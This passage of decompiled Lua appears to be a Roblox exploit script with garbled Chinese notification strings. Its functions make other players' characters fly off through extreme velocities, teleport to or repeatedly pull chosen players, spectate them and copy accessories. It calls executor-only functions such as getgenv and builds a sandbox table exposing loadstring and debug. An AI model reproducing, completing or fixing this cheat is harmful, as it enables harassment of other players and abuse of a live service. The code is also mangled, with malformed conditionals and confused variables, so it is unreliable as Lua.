                        Unpacked35 = table.unpack(Pack19, 1, Pack19.Element116)
                        Children = table.unpack(Pack19, 2, Pack19.Element116)
                        Unpacked36 = table.unpack(Pack19, 3, Pack19.Element116)
                        Pack19 = table.pack(Unpacked35(Children, Unpacked36))
                        Unpacked37 = table.unpack(Pack19, 1, Pack19.Element116)
                        Unpacked36 = Unpacked37
                        while true do
                            Unpacked34 = table.unpack(Pack19, 2, Pack19.Element116)
                            Destroy = Element147(Unpacked34)
                            if Destroy then
                                Unpacked38 = table.unpack(Pack19, 2, Pack19.Element116)
                                Unpacked34 = Unpacked38
                                Destroy = Unpacked38.Destroy
                                Destroy(Unpacked38)
                                Pack19 = table.pack(Unpacked35(Children, Unpacked36))
                                Unpacked37 = table.unpack(Pack19, 1, Pack19.Element116)
                                if Unpacked37 == nil then
                                    Unpacked35 = 0
                                    Children = 0
                                    Unpacked36 = ipairs
                                    Unpacked38 = Character13
                                    Unpacked37 = Character13.GetChildren
                                else
                                    Unpacked36 = Unpacked37
                                    continue
                                end
                            else
                                Pack19 = table.pack(ipairs(Children, Unpacked36))
                                Unpacked37 = ipairs(Children)
                                if Unpacked37 == nil then
                                    Unpacked35 = 0
                                    Children = 0
                                    Unpacked36 = ipairs
                                    Unpacked38 = Character13
                                    Unpacked37 = Character13.GetChildren
                                else
                                    Unpacked38 = Children
                                    Unpacked34 = Unpacked38
                                    Element147(Unpacked38)
                                    Pack19 = table.pack(Unpacked35(Children, Unpacked37))
                                    Unpacked37 = ipairs(Children)
                                    Unpacked36 = Unpacked37
                                    continue
                                end
                            end
                            break
                        end
                    end
                until true
                Unpacked37 = Unpacked37(Unpacked38)
                Pack19 = table.pack(Unpacked36(Unpacked37))
                Unpacked36 = table.unpack(Pack19, 1, Pack19.Element116)
                Unpacked37 = table.unpack(Pack19, 2, Pack19.Element116)
                Unpacked38 = table.unpack(Pack19, 3, Pack19.Element116)
                Pack19 = table.pack(Unpacked36(Unpacked37, Unpacked38))
                Destroy = table.unpack(Pack19, 1, Pack19.Element116)
                if not (Destroy == nil) then
                    Unpacked38 = Destroy
                    while true do
                        Unpacked34 = table.unpack(Pack19, 2, Pack19.Element116)
                        if Element147(Unpacked34) then
                            Unpacked34 = table.unpack(Pack19, 2, Pack19.Element116)
                            if Unpacked34:IsA("Accessory") then
                                Unpacked34 = table.unpack(Pack19, 2, Pack19.Element116)
                                pcall(Element148, Unpacked34, Character12)
                            else
                                pcall(Instance16)
                            end
                            Unpacked35 = Unpacked35 + 1
                        end
                        Pack19 = table.pack(Unpacked36(Unpacked37, Unpacked38))
                        Destroy = table.unpack(Pack19, 1, Pack19.Element116)
                        if Destroy ~= nil then
                            Unpacked38 = Destroy
                            continue
                        end
                        break
                    end
                end
                if Unpacked35 == 0 then
                    Unpacked36 = ipairs(Element150)
                    Unpacked37 = Element150
                    Pack19 = table.pack(Unpacked36(Unpacked37, 0))
                    Destroy = table.unpack(Pack19, 1, Pack19.Element116)
                    if not (Destroy == nil) then
                        Unpacked38 = Destroy
                        while true do
                            Unpacked34 = table.unpack(Pack19, 2, Pack19.Element116)
                            Unpacked34.Parent = Character12
                            Pack19 = table.pack(Unpacked36(Unpacked37, Unpacked38))
                            Destroy = table.unpack(Pack19, 1, Pack19.Element116)
                            if Destroy ~= nil then
                                Unpacked38 = Destroy
                                continue
                            end
                            break
                        end
                    end
                    Element31:Notify({
                    Title = "å¤±è´¥",
                    Content = "ç®æ ç©åé½æ æ³ä½¿ç¨ï¼å·²è¿å",
                    Duration = 4,
                    })
                else
                    local Element151 = {}
                    Unpacked38 = Element151
                    Element151.Title = "å®æ"
                    Unpacked34 = "å¤å¶ %dï¼è·³è¿ %d"
                    Element151.Content = ("å¤å¶ %dï¼è·³è¿ %d"):format(Unpacked35, Children)
                    Unpacked38.Duration = 3
                    Element31:Notify(Unpacked38)
                end
                return Request31, Character12, Character13, Humanoid13, Humanoid14, Element150, Unpacked35, Children
            end
        end
    end
end

local Aqua
local function getPlayers4()
    Aqua:GetPlayers()
    local Element152
    local Element153 = ipairs(Element152)
    local Pack20 = table.pack(Element153(Element152, 0))
    local Unpacked39 = table.unpack(Pack20, 1, Pack20.Element116)
    local Element154 = {}
    local Element155
    if not (Unpacked39 == nil) then
        Element155 = Unpacked39
        while true do
            if Pack20[2] ~= Rose then
                table.insert(Element154, Pack20[2].Name)
                Pack20 = table.pack(Element153(Element152, Element155))
                Unpacked39 = table.unpack(Pack20, 1, Pack20.Element116)
                if not (Unpacked39 == nil) then
                    Element155 = Unpacked39
                    continue
                end
            else
                Pack20 = table.pack(Element153(Element152, Element155))
                Unpacked39 = table.unpack(Pack20, 1, Pack20.Element116)
                if Unpacked39 == nil then
                    break
                else
                    Element155 = Unpacked39
                    continue
                end
            end
            return Element154
        end
    end
    return Element154
end

local Players
local function Job174(Request32)
    Players = Request32
end

local Element156, Element157
local function Job175()
    Element157:Refresh(Element156(), true)
    Element31:Notify({
    Title = "å·²å·æ°",
    Content = "ç©å®¶åè¡¨å·²æ´æ°",
    Duration = 2,
    })
end

local function Job176()
    local findFirstChild4
    if not Players then
        Element31:Notify({
        Title = "éè¯¯",
        Content = "è¯·åéæ©ç®æ ç©å®¶",
        Duration = 3,
        })
        return
    else
        findFirstChild4 = Aqua:FindFirstChild(Players)
        Element31:Notify({Title = "éè¯¯", Content = "æ¾ä¸å°ç©å®¶", Duration = 3})
        return findFirstChild4
    end
end

local function Job177()
    Rose:LoadCharacter()
    Element31:Notify({
    Title = "å·²è¿å",
    Content = "è§è²å·²éæ°å è½½",
    Duration = 2,
    })
end

local Players
local function runProtected5(Request33, Request34, Request35, Request36)
    local function Job178()
        local Element158 = {Title = Request33, Text = Request34}
        Element158.Icon = Request35 or "rbxassetid://71024334944141"
        Element158.Duration = Request36 or 3
        Players:SetCore("SendNotification", Element158)
    end
    pcall(Job178)
    return Request33, Request34, Request35, Request36
end

local DisguiseTab, Runservice5
local function getPlayers5()
    DisguiseTab:GetPlayers()
    local Element159
    local Element160 = ipairs(Element159)
    local Pack21 = table.pack(Element160(Element159, 0))
    local Unpacked40 = table.unpack(Pack21, 1, Pack21.Element116)
    local Element161 = {}
    local Element162
    if not (Unpacked40 == nil) then
        Element162 = Unpacked40
        while true do
            if Pack21[2] ~= Runservice5 then
                table.insert(Element161, Pack21[2].Name)
                Pack21 = table.pack(Element160(Element159, Element162))
                Unpacked40 = table.unpack(Pack21, 1, Pack21.Element116)
                if not (Unpacked40 == nil) then
                    Element162 = Unpacked40
                    continue
                end
            else
                Pack21 = table.pack(Element160(Element159, Element162))
                Unpacked40 = table.unpack(Pack21, 1, Pack21.Element116)
                if Unpacked40 == nil then
                    break
                else
                    Element162 = Unpacked40
                    continue
                end
            end
            if #Element161 == 0 then
                table.insert(Element161, "æ å¨çº¿ç©å®¶")
            end
            return Element161
        end
    end
    if #Element161 == 0 then
        table.insert(Element161, "æ å¨çº¿ç©å®¶")
    end
    return Element161
end

local Element163
local function getService(Request37)
    local Players, LocalPlayer17, Players
    local function transformValue(lower)
        lower = lower:lower()
        local PlayerList
        if lower == "all" or lower == "others"
        Players = true
        return
    elseif lower == "random"
        PlayerList = Players:GetPlayers()
        if table.find(PlayerList, LocalPlayer17) then
            table.remove(PlayerList, table.find(PlayerList, LocalPlayer17))
            return PlayerList[math.random(#PlayerList)]
        else
            return PlayerList[next(#PlayerList)]
        end
    else
        return
    end
end

local function Job179(Request38)
    local Character14, RootPart
    local function computeValue(Request39, Part, Request40)
        local Position2 = Request39.Position
        RootPart.CFrame = CFrame.new(Position2) * Part * Request40
        Position2 = Request39.Position
        Character14:SetPrimaryPartCFrame(CFrame.new(Position2) * Part * Request40)
        RootPart.Velocity = Vector3.new(90000000, 900000000, 90000000)
        RootPart.RotVelocity = Vector3.new(900000000, 900000000, 900000000)
        return Request39, Part, Request40
    end
    local Humanoid15, Humanoid16, Element164, RootPart2, Humanoid17
    local function processItems(Request41, ...)
        local Element165 = 0
        local Magnitude, Character15, Element166, WalkSpeed, Magnitude2
        if RootPart then
            Magnitude = Request41.Velocity.Magnitude
            if Magnitude < 50 then
                Element165 = 100
                Element166 = CFrame.new(0, 1.5, 0)
                Magnitude2 = Request41.Velocity.Magnitude
                Humanoid17(Request41, Element166 + Element164.MoveDirection * Magnitude2 / 1.25, CFrame.Angles(math.rad(100), 0, 0))
                local __cont13 = false
                while true do
                    task.wait(select(2, ...))
                    Element166 = CFrame.new(0,-1.5, 0)
                    Magnitude2 = Request41.Velocity.Magnitude
                    Humanoid17(Request41, Element166 + Element164.MoveDirection * Magnitude2 / 1.25, CFrame.Angles(math.rad(Element165), 0, 0))
                    task.wait(select(2, ...))
                    Element166 = CFrame.new(2.25, 1.5,-2.25)
                    Magnitude2 = Request41.Velocity.Magnitude
                    Humanoid17(Request41, Element166 + Element164.MoveDirection * Magnitude2 / 1.25, CFrame.Angles(math.rad(Element165), 0, 0))
                    task.wait(select(2, ...))
                    Element166 = CFrame.new(-2.25,-1.5, 2.25)
                    Magnitude2 = Request41.Velocity.Magnitude
                    Humanoid17(Request41, Element166 + Element164.MoveDirection * Magnitude2 / 1.25, CFrame.Angles(math.rad(Element165), 0, 0))
                    task.wait(select(2, ...))
                    Humanoid17(Request41, CFrame.new(0, 1.5, 0) + Element164.MoveDirection, CFrame.Angles(math.rad(Element165), 0, 0))
                    task.wait(select(2, ...))
                    Humanoid17(Request41, CFrame.new(0,-1.5, 0) + Element164.MoveDirection, CFrame.Angles(math.rad(Element165), 0, 0))
                    task.wait(select(2, ...))
                    while true do
                        Magnitude = Request41.Velocity.Magnitude
                        if Magnitude <= 500 then
                            Character15 = Request38.Character
                            if Request41.Parent == Character15 then
                                if not Request38.Character ~= Humanoid16 then
                                    if not Element164.Sit then
                                        if 0 < Humanoid15.Health then
                                            if 1700000002.0166667 >= tick(select(6, ...)) then
                                                Magnitude = RootPart
                                                if Magnitude then
                                                    Magnitude = Request41.Velocity.Magnitude
                                                    if Magnitude < 50 then
                                                        Element165 = Element165 + 100
                                                        Element166 = CFrame.new(0, 1.5, 0)
                                                        Magnitude2 = Request41.Velocity.Magnitude
                                                        Humanoid17(Request41, Element166 + Element164.MoveDirection * Magnitude2 / 1.25, CFrame.Angles(math.rad(Element165), 0, 0))
                                                        __cont13 = true
                                                        break
                                                    else
                                                        WalkSpeed = Element164.WalkSpeed
                                                        Humanoid17(Request41, CFrame.new(0, 1.5, WalkSpeed), CFrame.Angles(5156.620156177409, 0, 0))
                                                        task.wait(select(2, ...))
                                                        WalkSpeed =-Element164.WalkSpeed
                                                        Humanoid17(Request41, CFrame.new(0,-1.5, WalkSpeed), CFrame.Angles(0, 0, 0))
                                                        task.wait(select(2, ...))
                                                        WalkSpeed = Element164.WalkSpeed
                                                        Humanoid17(Request41, CFrame.new(0, 1.5, WalkSpeed), CFrame.Angles(5156.620156177409, 0, 0))
                                                        task.wait(select(2, ...))
                                                        WalkSpeed = RootPart2.Velocity.Magnitude / 1.25
                                                        Humanoid17(Request41, CFrame.new(0, 1.5, WalkSpeed), CFrame.Angles(5156.620156177409, 0, 0))
                                                        task.wait(select(2, ...))
                                                        WalkSpeed =-RootPart2.Velocity.Magnitude / 1.25
                                                        Humanoid17(Request41, CFrame.new(0,-1.5, WalkSpeed), CFrame.Angles(0, 0, 0))
                                                        task.wait(select(2, ...))
                                                        WalkSpeed = RootPart2.Velocity.Magnitude / 1.25
                                                        Humanoid17(Request41, CFrame.new(0, 1.5, WalkSpeed), CFrame.Angles(5156.620156177409, 0, 0))
                                                        task.wait(select(2, ...))
                                                        WalkSpeed =-Element164.WalkSpeed
                                                        Humanoid17(Request41, CFrame.new(0,-1.5, WalkSpeed), CFrame.Angles(0, 0, 0))
                                                        task.wait(select(2, ...))
                                                        WalkSpeed = Element164.WalkSpeed
                                                        Humanoid17(Request41, CFrame.new(0, 1.5, WalkSpeed), CFrame.Angles(5156.620156177409, 0, 0))
                                                        task.wait(select(2, ...))
                                                        WalkSpeed = RootPart2.Velocity.Magnitude / 1.25
                                                        Humanoid17(Request41, CFrame.new(0, 1.5, WalkSpeed), CFrame.Angles(5156.620156177409, 0, 0))
                                                        task.wait(select(2, ...))
                                                        WalkSpeed =-RootPart2.Velocity.Magnitude / 1.25
                                                        Humanoid17(Request41, CFrame.new(0,-1.5, WalkSpeed), CFrame.Angles(0, 0, 0))
                                                        task.wait(select(2, ...))
                                                        WalkSpeed = RootPart2.Velocity.Magnitude / 1.25
                                                        Humanoid17(Request41, CFrame.new(0, 1.5, WalkSpeed), CFrame.Angles(5156.620156177409, 0, 0))
                                                        task.wait(select(2, ...))
                                                        Humanoid17(Request41, CFrame.new(0,-1.5, 0), CFrame.Angles(5156.620156177409, 0, 0))
                                                        task.wait(select(2, ...))
                                                        Humanoid17(Request41, CFrame.new(0,-1.5, 0), CFrame.Angles(0, 0, 0))
                                                        task.wait(select(2, ...))
                                                        Humanoid17(Request41, CFrame.new(0,-1.5, 0), CFrame.Angles(-5156.620156177409, 0, 0))
                                                        task.wait(select(2, ...))
                                                        Humanoid17(Request41, CFrame.new(0,-1.5, 0), CFrame.Angles(0, 0, 0))
                                                        task.wait(select(2, ...))
                                                        continue
                                                    end
                                                end
                                                break
                                            end
                                            break
                                        end
                                        break
                                    end
                                    break
                                end
                                break
                            end
                            break
                        end
                        break
                    end
                    if __cont13 then
                        __cont13 = false
                        continue
                    end
                    break
                end
            else
                WalkSpeed = Element164.WalkSpeed
                Humanoid17(Request41, CFrame.new(0, 1.5, WalkSpeed), CFrame.Angles(5156.620156177409, 0, 0))
                local __cont22 = false
                while true do
                    task.wait(select(2, ...))
                    WalkSpeed =-Element164.WalkSpeed
                    Humanoid17(Request41, CFrame.new(0,-1.5, WalkSpeed), CFrame.Angles(0, 0, 0))
                    task.wait(select(2, ...))
                    WalkSpeed = Element164.WalkSpeed
                    Humanoid17(Request41, CFrame.new(0, 1.5, WalkSpeed), CFrame.Angles(5156.620156177409, 0, 0))
                    task.wait(select(2, ...))
                    WalkSpeed = RootPart2.Velocity.Magnitude / 1.25
                    Humanoid17(Request41, CFrame.new(0, 1.5, WalkSpeed), CFrame.Angles(5156.620156177409, 0, 0))
                    task.wait(select(2, ...))
                    WalkSpeed =-RootPart2.Velocity.Magnitude / 1.25
                    Humanoid17(Request41, CFrame.new(0,-1.5, WalkSpeed), CFrame.Angles(0, 0, 0))
                    task.wait(select(2, ...))
                    WalkSpeed = RootPart2.Velocity.Magnitude / 1.25
                    Humanoid17(Request41, CFrame.new(0, 1.5, WalkSpeed), CFrame.Angles(5156.620156177409, 0, 0))
                    task.wait(select(2, ...))
                    WalkSpeed =-Element164.WalkSpeed
                    Humanoid17(Request41, CFrame.new(0,-1.5, WalkSpeed), CFrame.Angles(0, 0, 0))
                    task.wait(select(2, ...))
                    WalkSpeed = Element164.WalkSpeed
                    Humanoid17(Request41, CFrame.new(0, 1.5, WalkSpeed), CFrame.Angles(5156.620156177409, 0, 0))
                    task.wait(select(2, ...))
                    WalkSpeed = RootPart2.Velocity.Magnitude / 1.25
                    Humanoid17(Request41, CFrame.new(0, 1.5, WalkSpeed), CFrame.Angles(5156.620156177409, 0, 0))
                    task.wait(select(2, ...))
                    WalkSpeed =-RootPart2.Velocity.Magnitude / 1.25
                    Humanoid17(Request41, CFrame.new(0,-1.5, WalkSpeed), CFrame.Angles(0, 0, 0))
                    task.wait(select(2, ...))
                    WalkSpeed = RootPart2.Velocity.Magnitude / 1.25
                    Humanoid17(Request41, CFrame.new(0, 1.5, WalkSpeed), CFrame.Angles(5156.620156177409, 0, 0))
                    task.wait(select(2, ...))
                    Humanoid17(Request41, CFrame.new(0,-1.5, 0), CFrame.Angles(5156.620156177409, 0, 0))
                    task.wait(select(2, ...))
                    Humanoid17(Request41, CFrame.new(0,-1.5, 0), CFrame.Angles(0, 0, 0))
                    task.wait(select(2, ...))
                    Humanoid17(Request41, CFrame.new(0,-1.5, 0), CFrame.Angles(-5156.620156177409, 0, 0))
                    task.wait(select(2, ...))
                    Humanoid17(Request41, CFrame.new(0,-1.5, 0), CFrame.Angles(0, 0, 0))
                    task.wait(select(2, ...))
                    while true do
                        Magnitude = Request41.Velocity.Magnitude
                        if Magnitude <= 500 then
                            Character15 = Request38.Character
                            if Request41.Parent == Character15 then
                                if not Request38.Character ~= Humanoid16 then
                                    if not Element164.Sit then
                                        if 0 < Humanoid15.Health then
                                            if 1700000002.0166667 >= tick(select(6, ...)) then
                                                Magnitude = RootPart
                                                if Magnitude then
                                                    Magnitude = Request41.Velocity.Magnitude
                                                    if Magnitude < 50 then
                                                        Element165 = Element165 + 100
                                                        Element166 = CFrame.new(0, 1.5, 0)
                                                        Magnitude2 = Request41.Velocity.Magnitude
                                                        Humanoid17(Request41, Element166 + Element164.MoveDirection * Magnitude2 / 1.25, CFrame.Angles(math.rad(Element165), 0, 0))
                                                        task.wait(select(2, ...))
                                                        Element166 = CFrame.new(0,-1.5, 0)
                                                        Magnitude2 = Request41.Velocity.Magnitude
                                                        Humanoid17(Request41, Element166 + Element164.MoveDirection * Magnitude2 / 1.25, CFrame.Angles(math.rad(Element165), 0, 0))
                                                        task.wait(select(2, ...))
                                                        Element166 = CFrame.new(2.25, 1.5,-2.25)
                                                        Magnitude2 = Request41.Velocity.Magnitude
                                                        Humanoid17(Request41, Element166 + Element164.MoveDirection * Magnitude2 / 1.25, CFrame.Angles(math.rad(Element165), 0, 0))
                                                        task.wait(select(2, ...))
                                                        Element166 = CFrame.new(-2.25,-1.5, 2.25)
                                                        Magnitude2 = Request41.Velocity.Magnitude
                                                        Humanoid17(Request41, Element166 + Element164.MoveDirection * Magnitude2 / 1.25, CFrame.Angles(math.rad(Element165), 0, 0))
                                                        task.wait(select(2, ...))
                                                        Humanoid17(Request41, CFrame.new(0, 1.5, 0) + Element164.MoveDirection, CFrame.Angles(math.rad(Element165), 0, 0))
                                                        task.wait(select(2, ...))
                                                        Humanoid17(Request41, CFrame.new(0,-1.5, 0) + Element164.MoveDirection, CFrame.Angles(math.rad(Element165), 0, 0))
                                                        task.wait(select(2, ...))
                                                        continue
                                                    else
                                                        WalkSpeed = Element164.WalkSpeed
                                                        Humanoid17(Request41, CFrame.new(0, 1.5, WalkSpeed), CFrame.Angles(5156.620156177409, 0, 0))
                                                        __cont22 = true
                                                        break
                                                    end
                                                end
                                                break
                                            end
                                            break
                                        end
                                        break
                                    end
                                    break
                                end
                                break
                            end
                            break
                        end
                        break
                    end
                    if __cont22 then
                        __cont22 = false
                        continue
                    end
                    break
                end
            end
            return Request41, 1700000000.0166667, Element165, Magnitude
        else
            return Request41, 1700000000.0166667
        end
    end
    local function InstanceOf(Request42, Instance17)
        local Instance18
        if Instance17:IsA("BasePart") then
            Instance18 = Vector3.new()
            Instance17.RotVelocity = Vector3.new()
            Instance17.Velocity = Instance18
        end
    end
    Character14 = LocalPlayer17.Character
    Humanoid15 = Character14
    if Humanoid15 then
        Humanoid16 = "Humanoid"
        RootPart = Character14
        Humanoid15 = Character14:FindFirstChildOfClass("Humanoid")
    end
    RootPart = Humanoid15 and Humanoid15.RootPart
    Humanoid16 = Request38.Character
    Element164 = nil
    RootPart2 = nil
    local Head2 = nil
    local Element167 = nil
    local Handle2 = nil
    Humanoid17 = Humanoid16:FindFirstChildOfClass("Humanoid")
    if Humanoid17 then
        Humanoid17 = Humanoid16:FindFirstChildOfClass("Humanoid")
        Element164 = Humanoid17
    end
    Humanoid17 = Element164 and Element164.RootPart
    if Humanoid17 then
        RootPart2 = Element164.RootPart
    end
    Humanoid17 = Humanoid16:FindFirstChild("Head")
    if Humanoid17 then
        Head2 = Humanoid16.Head
    end
    Humanoid17 = Humanoid16:FindFirstChildOfClass("Accessory")
    if Humanoid17 then
        Humanoid17 = Humanoid16:FindFirstChildOfClass("Accessory")
        Element167 = Humanoid17
    end
    Humanoid17 = Element167 and Element167:FindFirstChild("Handle")
    if Humanoid17 then
        Handle2 = Element167.Handle
    end
    Humanoid17 = Character14 and Humanoid15 and RootPart
    if Humanoid17 then
        Humanoid17 = RootPart.Velocity.Magnitude
        if Humanoid17 < 50 then
            Humanoid17 = getgenv()
            Humanoid17.OldPos = RootPart.CFrame
        end
    end
    Humanoid17 = Element163
    Element163("çª", "ç©å®¶æ¶å¤±ï¼å·²åæ­¢", "rbxassetid://71024334944141", 3)
    return Request38, Character14, Humanoid15, RootPart, Humanoid16, Element164, RootPart2, Head2, Element167, Handle2
end

local Element168 = not Request37
if not Element168 then
    Players = ""
    Element168 = Request37 == ""
end

if not Element168 then
    Players = "æ å¶ä»ç©å®¶"
    Element168 = Request37 == "æ å¶ä»ç©å®¶"
end

local Element169, Element170, Element171, GetPlayers, Element172, Element173, Element174, Element175, Pack22
if not Element168 then
    Element168 = {[1] = Request37}
    Players = "Players"
    LocalPlayer17 = game
    Players = game:GetService("Players")
    LocalPlayer17 = Players.LocalPlayer
    Players = false
    Element169 = transformValue
    Element170 = Job179
    if Element168[1] then
        table.pack(next(Element168, nil))
        if not (next(Element168) == nil) then
            while true do
                Element174 = Element169(Element168)
                if Element174 then
                    Element170(Element174)
                    if not (next(GetPlayers) == nil) then
                        continue
                    end
                elseif next(GetPlayers) == nil then
                    break
                else
                    continue
                end
                break
            end
        end
        if Players then
            GetPlayers = Players.GetPlayers
            Pack22 = table.pack(GetPlayers(Players))
            table.unpack(Pack22, 1, Pack22.Pack22)
            table.unpack(Pack22, 2, Pack22.Pack22)
            if not (next(GetPlayers) == nil) then
                while true do
                    if Pack22[2] ~= LocalPlayer17 then
                        Element170(table.unpack(Pack22, 2, Pack22.Pack22))
                        if not (next(GetPlayers) == nil) then
                            continue
                        end
                    elseif next(GetPlayers) == nil then
                        break
                    else
                        continue
                    end
                    break
                end
            end
        end
        Element171 = next
        GetPlayers = Element168
        Element173 = next(Element168)
        if not (Element173 == nil) then
            while true do
                Element174 = Element169(Element168)
                if Element174 and Element174 ~= LocalPlayer17 then
                    if Element174.UserId ~= 1414978355 then
                        Element170(Element174)
                    else
                        Element163("çª", "æ£æµå°ç©å®¶æ¶å¤±ï¼å·²åæ­¢", "rbxassetid://71024334944141", 3)
                    end
                    Element173 = next(GetPlayers)
                    if Element173 == nil then
                        Element172 = Element173
                    else
                        continue
                    end
                else
                    Element175 = not Element169(select(2, next(Element168, nil)))
                    Element173 = next(GetPlayers)
                    if Element173 == nil then
                        break
                    else
                        continue
                    end
                end
                return Request37, Element168, Players, LocalPlayer17, Players, Element169, Element170, Element171, GetPlayers, Element172, next(Element168, nil)
            end
        end
        return Request37, Element168, Players, LocalPlayer17, Players, Element169, Element170, Element171, GetPlayers, Element173, next(Element168, nil)
    else
        return
    end
end

end

local Element176
local function Job180(playernamedied)
    Element176.playernamedied = playernamedied
end

local Element177, Element178
local function Job181()
    Element178:Refresh(Element177())
    Element163("çª", "ç©å®¶åè¡¨å·²å·æ°", "rbxassetid://71024334944141", 3)
end

local function Job182()
    local HumanoidRootPart8 = Runservice5.Character and Runservice5.Character:FindFirstChild("HumanoidRootPart")
    local Instance19 = Element176.playernamedied and DisguiseTab:FindFirstChild(Element176.playernamedied)
    local Character16 = HumanoidRootPart8
    if HumanoidRootPart8 then
        Character16 = Instance19
    end
    if Character16 then
        Character16 = Instance19.Character
    end
    if Character16 then
        Character16 = Instance19.Character:FindFirstChild("HumanoidRootPart")
    end
    if Character16 then
        HumanoidRootPart8.CFrame = Instance19.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
        Element163("çª", "å·²ä¼ éå°ç©å®¶æè¾¹", "rbxassetid://71024334944141", 3)
    else
        Element163("çª", "æ æ³ä¼ éï¼ç©å®¶å·²æ¶å¤±", "rbxassetid://71024334944141", 3)
    end
    return HumanoidRootPart8, Instance19
end

local function Job183(loopTeleport)
    local function Job184(...)
        local HumanoidRootPart9, Element179
        if Element176.LoopTeleport then
            task.wait()
            HumanoidRootPart9 = Runservice5.Character:FindFirstChild("HumanoidRootPart")
            Element179 = Element176.playernamedied and DisguiseTab:FindFirstChild(Element176.playernamedied)
            if HumanoidRootPart9 and Element179 and Element179.Character and Element179.Character:FindFirstChild("HumanoidRootPart") then
                HumanoidRootPart9.CFrame = Element179.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
            end
            task.wait(select(2, ...))
            Element179 = Runservice5
            while true do
                HumanoidRootPart9 = Element179.Character and Runservice5.Character:FindFirstChild("HumanoidRootPart")
                Element179 = Element176.playernamedied and DisguiseTab:FindFirstChild(Element176.playernamedied)
                if HumanoidRootPart9 and Element179 and Element179.Character and Element179.Character:FindFirstChild("HumanoidRootPart") then
                    HumanoidRootPart9.CFrame = Element179.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
                end
                if Element176.LoopTeleport then
                    task.wait(select(2, ...))
                    Element179 = Runservice5
                    continue
                end
                break
            end
        end
    end
    Element176.LoopTeleport = loopTeleport
    if loopTeleport then
        Element163("çª", "å·²å¼å¯å¾ªç¯ä¼ é", "rbxassetid://71024334944141", 3)
        task.spawn(Job184)
    else
        Element163("çª", "å·²å³é­å¾ªç¯ä¼ é", "rbxassetid://71024334944141", 3)
    end
    return loopTeleport
end

local function Job185()
    local HumanoidRootPart10 = Runservice5.Character and Runservice5.Character:FindFirstChild("HumanoidRootPart")
    local Instance20 = Element176.playernamedied and DisguiseTab:FindFirstChild(Element176.playernamedied)
    local Character17 = HumanoidRootPart10
    if HumanoidRootPart10 then
        Character17 = Instance20
    end
    if Character17 then
        Character17 = Instance20.Character
    end
    if Character17 then
        Character17 = Instance20.Character:FindFirstChild("HumanoidRootPart")
    end
    local CFrame4
    if Character17 then
        CFrame4 = HumanoidRootPart10.CFrame
        Instance20.Character.HumanoidRootPart.CFrame = CFrame4 + Vector3.new(0, 3, 0)
        Element163("çª", "å·²å°ç©å®¶ä¼ éè¿æ¥", "rbxassetid://71024334944141", 3)
    else
        Element163("çª", "æ æ³ä¼ éï¼ç©å®¶å·²æ¶å¤±", "rbxassetid://71024334944141", 3)
    end
    return HumanoidRootPart10, Instance20
end

local function Job186(loopTeleport2)
    local function Job187(...)
        local HumanoidRootPart11, Element180, CFrame5
        if Element176.LoopTeleport then
            task.wait()
            HumanoidRootPart11 = Runservice5.Character:FindFirstChild("HumanoidRootPart")
            Element180 = Element176.playernamedied and DisguiseTab:FindFirstChild(Element176.playernamedied)
            if HumanoidRootPart11 and Element180 and Element180.Character and Element180.Character:FindFirstChild("HumanoidRootPart") then
                CFrame5 = HumanoidRootPart11.CFrame
                Element180.Character.HumanoidRootPart.CFrame = CFrame5 + Vector3.new(0, 3, 0)
            end
            task.wait(select(2, ...))
            Element180 = Runservice5
            while true do
                HumanoidRootPart11 = Element180.Character and Runservice5.Character:FindFirstChild("HumanoidRootPart")
                Element180 = Element176.playernamedied and DisguiseTab:FindFirstChild(Element176.playernamedied)
                if HumanoidRootPart11 and Element180 and Element180.Character and Element180.Character:FindFirstChild("HumanoidRootPart") then
                    CFrame5 = HumanoidRootPart11.CFrame
                    Element180.Character.HumanoidRootPart.CFrame = CFrame5 + Vector3.new(0, 3, 0)
                end
                if Element176.LoopTeleport then
                    task.wait(select(2, ...))
                    Element180 = Runservice5
                    continue
                end
                break
            end
        end
    end
    Element176.LoopTeleport = loopTeleport2
    if loopTeleport2 then
        Element163("çª", "å·²å¼å¯å¾ªç¯ä¼ éç©å®¶è¿æ¥", "rbxassetid://71024334944141", 3)
        task.spawn(Job187)
    else
        Element163("çª", "å·²å³é­å¾ªç¯ä¼ éç©å®¶è¿æ¥", "rbxassetid://71024334944141", 3)
    end
    return loopTeleport2
end

local Startergui2
local function Job188(Request43)
    local Instance21 = Element176.playernamedied and DisguiseTab:FindFirstChild(Element176.playernamedied)
    local Character18
    if Request43 then
        if Instance21 and Instance21.Character and Instance21.Character:FindFirstChild("Humanoid") then
            Character18 = Instance21.Character.Humanoid
            Startergui2.CurrentCamera.CameraSubject = Character18
            Element163("çª", "å·²å¼å¯æ¥çç©å®¶", "rbxassetid://71024334944141", 3)
            return Request43, Instance21
        end
    elseif Runservice5.Character and Runservice5.Character:FindFirstChild("Humanoid") then
        Character18 = Runservice5.Character.Humanoid
        Startergui2.CurrentCamera.CameraSubject = Character18
        Element163("çª", "å·²å³é­æ¥çç©å®¶", "rbxassetid://71024334944141", 3)
        return Request43, Instance21
    end
end

local function Job189()
    local findFirstChild5
    if not Element176.playernamedied then
        Element163("çª", "è¯·åéæ©ç©å®¶", "rbxassetid://71024334944141", 3)
        return
    else
        findFirstChild5 = DisguiseTab:FindFirstChild(Element176.playernamedied)
        Element163("çª", "æ¾ä¸å°ç©å®¶", "rbxassetid://71024334944141", 3)
        return findFirstChild5
    end
end

local Element181
local function Job190(Request44)
    local function Job191(...)
        local Element182 = {
        print = print,
        type = type,
        tostring = tostring,
        tonumber = tonumber,
        next = next,
        pairs = pairs,
        ipairs = ipairs,
        select = select,
        rawget = rawget,
        rawset = rawset,
        rawequal = rawequal,
        rawlen = rawlen,
        setmetatable = setmetatable,
        getmetatable = getmetatable,
        assert = assert,
        error = error,
        pcall = pcall,
        xpcall = xpcall,
        unpack = unpack,
        getfenv = getfenv,
        setfenv = setfenv,
        collectgarbage = collectgarbage,
        gcinfo = gcinfo,
        newproxy = newproxy,
        require = require,
        load = load,
        loadstring = load,
        _VERSION = "Lua 5.1",
        string = string,
        table = table,
        math = math,
        bit32 = bit32,
        bit = bit32,
        os = os,
        io = io,
        utf8 = utf8,
        debug = debug,
        coroutine = coroutine,
        buffer = buffer,
        game = game,
        Game = game,
        workspace = workspace,
        Workspace = workspace,
        script = script,
        shared = shared,
        plugin = plugin,
        Instance = Instance,
        Vector2 = Vector2,
        Vector3 = Vector3,
        Vector2int16 = Vector2int16,
